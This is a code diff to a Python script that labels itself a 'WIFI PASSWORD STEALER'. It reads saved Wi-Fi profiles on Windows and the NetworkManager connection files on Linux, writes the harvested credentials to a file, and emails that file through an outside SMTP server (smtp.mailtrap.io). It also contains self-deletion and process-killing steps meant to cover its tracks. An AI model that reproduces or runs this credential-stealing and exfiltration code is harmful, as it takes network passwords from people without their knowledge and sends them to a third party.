@@ -15,42 +15,23 @@ var = 2
 # ==============================
 # ==============================
 
-username = "YOUR SMTP USERNAME"
-password= "YOUR SMTP PASSWORD"
+YOUR_USERNAME = "YOUR_USERNAME"
+YOUR_PASSWORD= "YOUR_PASSWORD"
 
 # ==============================
 # ==============================
 
 file_path = os.getcwd()
-email_address = 'smtp.mailtrap.io'
 
+sender = "Private Person <from@example.com>"
+receiver = "A Test User <to@example.com>"
 
-def send_email(filename, attachment):
-    fromaddr = email_address
-    toaddr = email_address
-    msg = MIMEMultipart()
+message = f"""\
+Subject: aydinnyunus have sent you message
+To: {receiver}
+From: {sender}
 
-    msg['From'] = fromaddr
-    msg['To'] = toaddr
-    msg['Subject'] = "Log File"
-
-    body = "Body_of_the_mail"
-    msg.attach(MIMEText(body, 'plain'))
-    filename = filename
-    attachment = open(attachment, "rb")
-    p = MIMEBase('application', 'octet-stream')
-    p.set_payload((attachment).read())
-
-    encoders.encode_base64(p)
-    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
-    msg.attach(p)
-
-    s = smtplib.SMTP('smtp.mailtrap.io', 587)
-    s.starttls()
-    s.login(username, password)
-    text = msg.as_string()
-    s.sendmail(fromaddr, toaddr, text)
-    s.quit()
+WIFI PASSWORD STEALER by aydinnyunus.\n"""
 
 
 if os.name == "nt":
@@ -61,7 +42,7 @@ if os.name == "nt":
     substring = output[start:end]
     list_of_word = output.split()
     j = 2
-    with open(file_path + "\\" + system_information, "a") as f:
+    with open(file_path + "\\" + system_information, "w") as f:
         f.write("All of Registered Connections\n")
         f.write("==================================\n")
         f.close()
@@ -115,8 +96,22 @@ if os.name == "nt":
         os.system("DEL " + os.path.basename(__file__))
     except OSError:
         print('File is close.')
+
+    with open(system_information) as f:
+        lines = f.read()
+
+    print(str(lines))
+    message += str(lines)
+
+    with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
+        server.login(YOUR_USERNAME, YOUR_PASSWORD)
+        server.sendmail(sender, receiver, message)
+
 else:
-    os.system("chmod +x " + os.path.basename(_file_))
+    #os.system("chmod +x " + os.path.basename(__file__))
+    with open(file_path + "/" + system_information, "w") as f:
+        f.write("All of Registered Connections\n")
+        f.write("==================================\n")
     try:
         output = glob.glob("/etc/NetworkManager/system-connections/*")
 
@@ -124,9 +119,8 @@ else:
         for i in res:
             output = subprocess.check_output("cat " + i, shell=True)
             output = str(output)
-            with open(file_path + "\\" + system_information, "a") as f:
+            with open(file_path + "/" + system_information, "a") as f:
                 f.write(output + "\n===========================\n")
-                f.close()
     except:
         pass
     try:
@@ -135,9 +129,21 @@ else:
         os.system('pkill leafpad')
         os.system("chattr -i " + os.path.basename(__file__))
         print('File was closed.')
-        os.system("rm -rf" + os.path.basename(__file__))
+        # os.system("rm -rf " + os.path.basename(__file__))
     except OSError:
         print('File is close.')
+
+    f.close()
+    with open(system_information) as f:
+        lines = f.read()
+
+    print(str(lines))
+    message += str(lines)
+
+    with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
+        server.login(YOUR_USERNAME, YOUR_PASSWORD)
+        server.sendmail(sender, receiver, message)
+    
+
     #os.system("./" + os.path.basename(_file_))
-send_email(system_information, file_path + "\\" + system_information)
 os.remove("Informations.txt")
